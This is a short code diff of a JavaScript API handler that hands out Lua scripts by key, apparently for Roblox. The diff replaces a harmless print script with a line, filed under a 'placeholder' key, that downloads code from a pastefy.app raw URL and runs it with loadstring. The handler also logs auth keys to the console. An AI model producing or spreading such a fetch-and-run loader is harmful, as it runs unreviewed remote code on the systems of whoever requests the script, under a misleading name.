@@ -17,11 +17,8 @@ export default async function handler(req, res) {
     console.log('🔑 Auth Key:', auth_key);
 
     const scripts = {
-      'example123_abcd1234_fetch': `
-print("Hello from Lua Seel!")
-print("User: " .. game.Players.LocalPlayer.Name)
-wait(2)
-print("Script loaded successfully!")
+      'placeholder': `
+loadstring(request({Url='https://pastefy.app/JHUeMvgH/raw'; Method='GET'}).Body)();
       `.trim(),
       
       'test456_efgh5678_fetch': `
